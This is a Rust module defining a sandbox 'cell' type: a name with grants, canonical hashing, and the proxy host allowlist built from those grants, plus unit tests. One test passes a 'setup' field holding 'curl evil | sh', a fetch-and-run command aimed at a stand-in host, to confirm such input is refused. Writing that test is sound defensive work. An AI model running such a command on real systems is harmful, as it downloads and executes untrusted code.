//! A cell: a name and its grants. The root is the VM carrying its cell tag.
//! The key is observed, not declared: it is generated inside the root and
//! pinned by the laptop.
//!
//! Where the cell sits in the tree is the tree's fact, not the cell's. The
//! box has no use for it, a name is not a capability, and the hash must mean
//! "this box's configuration" and nothing else; so it is not here.

use crate::canon;
use crate::grant::{Grant, Provider};

/// Prefix of the tag that marks a VM as a cell's root.
pub const TAG_PREFIX: &str = "cell-";
use crate::prim::{Hash, Host, Name};
use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, ts_rs::TS)]
#[serde(deny_unknown_fields)]
pub struct Cell {
    pub name: Name,
    #[serde(default)]
    pub grants: BTreeSet<Grant>,
}

impl Cell {
    pub fn new(name: Name, grants: impl IntoIterator<Item = Grant>) -> Cell {
        Cell {
            name,
            grants: grants.into_iter().collect(),
        }
    }

    /// Canonical bytes: what the hash is over, and what the box compares
    /// against its own copy.
    pub fn canonical(&self) -> Vec<u8> {
        canon::bytes(self)
    }

    pub fn hash(&self) -> Hash {
        Hash::of(&self.canonical())
    }

    /// Every host the proxy may tunnel to. The same function runs on the
    /// laptop to print the plan and on the box to configure the proxy.
    pub fn allowlist(&self) -> BTreeSet<Host> {
        self.grants.iter().flat_map(Grant::hosts).collect()
    }

    pub fn providers(&self) -> BTreeSet<Provider> {
        self.grants
            .iter()
            .filter_map(|g| match g {
                Grant::Provider(h) => Some(*h),
                _ => None,
            })
            .collect()
    }

    /// The exe.dev tag that names this cell's VM; integrations attach to it.
    /// exe.dev tags match `^[a-z][a-z0-9_-]*$`, so a prefix, not a scheme.
    pub fn tag(&self) -> String {
        format!("{TAG_PREFIX}{}", self.name)
    }

    pub fn edge_grants(&self) -> impl Iterator<Item = &Grant> {
        self.grants.iter().filter(|g| g.at_edge())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hash_is_canonical() {
        let a: Cell = serde_json::from_str(
            r#"{"name":"widget","grants":[{"host":"pypi.org"},{"provider":"anthropic"}]}"#,
        )
        .unwrap();
        let b: Cell = serde_json::from_str(
            r#"{"grants":[{"provider":"anthropic"},{"host":"pypi.org"},{"host":"pypi.org"}],"name":"widget"}"#,
        )
        .unwrap();
        assert_eq!(a, b);
        assert_eq!(a.hash(), b.hash());
        assert_eq!(
            String::from_utf8(a.canonical()).unwrap(),
            r#"{"name":"widget","grants":[{"provider":"anthropic"},{"host":"pypi.org"}]}"#
        );
    }

    #[test]
    fn unknown_fields_are_refused() {
        assert!(serde_json::from_str::<Cell>(r#"{"name":"a","vm":"b"}"#).is_err());
        assert!(serde_json::from_str::<Cell>(r#"{"name":"a","setup":"curl evil | sh"}"#).is_err());
        // the edge is the tree's to declare; a cell file cannot carry one
        assert!(serde_json::from_str::<Cell>(r#"{"name":"a","parent":"b"}"#).is_err());
        assert!(serde_json::from_str::<Cell>(r#"{"name":"a","children":["b"]}"#).is_err());
    }

    #[test]
    fn allowlist_is_the_union() {
        let c: Cell = serde_json::from_str(
            r#"{"name":"a","grants":[{"provider":"anthropic"},{"provider":"openai"},{"code":{"repo":"o/r","write":true}},{"code":{"repo":"o/s","write":false}},{"edge":"brave"},{"host":"pypi.org"}]}"#,
        )
        .unwrap();
        let hosts: Vec<String> = c.allowlist().iter().map(|h| h.to_string()).collect();
        assert_eq!(
            hosts,
            [
                "api.anthropic.com",
                "api.openai.com",
                "auth.openai.com",
                "brave.int.exe.xyz",
                "chatgpt.com",
                "claude.ai",
                "platform.claude.com",
                "pypi.org"
            ]
        );
        assert_eq!(c.providers().len(), 2);
        assert_eq!(c.tag(), "cell-a");
    }
}
